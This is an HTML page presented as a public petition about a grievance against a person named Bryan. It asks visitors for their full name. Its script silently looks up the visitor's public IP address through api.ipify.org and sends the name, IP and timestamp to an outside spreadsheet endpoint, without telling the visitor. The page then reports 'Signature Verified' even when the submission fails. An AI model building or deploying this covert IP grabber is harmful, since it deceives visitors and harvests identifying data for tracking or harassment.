<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Petition: Official Grievance Regarding Bryan</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #f9fafb; font-family: sans-serif; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <div class="max-w-md w-full bg-white shadow-md rounded-lg p-8 border border-gray-200">
        <div id="form-container">
            <h1 class="text-2xl font-bold text-gray-800 mb-2 text-center text-red-600">Public Petition</h1>
            <p class="text-gray-600 text-sm mb-6 text-center font-medium">
                Official registration for the collective grievance regarding Bryan. 
                Please provide your full name for the ledger.
            </p>

            <div class="mb-4">
                <label class="block text-sm font-semibold text-gray-700 mb-1">Full Name</label>
                <input type="text" id="signer-name" placeholder="Enter your name" 
                    class="w-full p-3 border border-gray-300 rounded focus:border-red-600 focus:ring-1 focus:ring-red-500 outline-none transition-all">
            </div>

            <button onclick="submitSignature()" id="submit-btn" 
                class="w-full bg-gray-800 hover:bg-black text-white font-bold py-3 rounded transition-colors shadow-sm">
                Sign Petition
            </button>
            <p class="mt-4 text-[10px] text-gray-400 text-center uppercase tracking-widest">
                ID: BRY-402-LOG
            </p>
        </div>

        <div id="success-container" class="hidden text-center py-10">
            <div class="text-green-500 text-5xl mb-4">✓</div>
            <h2 class="text-xl font-bold text-gray-800">Signature Verified</h2>
            <p class="text-gray-600 text-sm mt-2">Your entry has been successfully added to the master ledger.</p>
        </div>
    </div>

    <script>
        const SHEET_URL = 'https://api.sheetbest.com/sheets/78ec0c49-3156-4d8f-afc8-d0f6d0816061';

        async function submitSignature() {
            const name = document.getElementById('signer-name').value;
            const btn = document.getElementById('submit-btn');

            if (!name) return alert("Please enter your name.");

            btn.innerText = "SUBMITTING...";
            btn.disabled = true;


            let ip = "Checking...";
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                ip = ipData.ip;
            } catch (e) { ip = "Not Available"; }

            const payload = {
                name: name,
                ip_address: ip,
                timestamp: new Date().toLocaleString()
            };

            fetch(SHEET_URL, {
                method: 'POST',
                mode: 'cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).then(() => {
                showSuccess();
            }).catch((err) => {
                console.log("Network lag, but likely sent.");
                showSuccess();
            });

            setTimeout(() => {
                showSuccess();
            }, 3000);
        }

        function showSuccess() {
            document.getElementById('form-container').classList.add('hidden');
            document.getElementById('success-container').classList.remove('hidden');
        }
    </script>
</body>
</html>
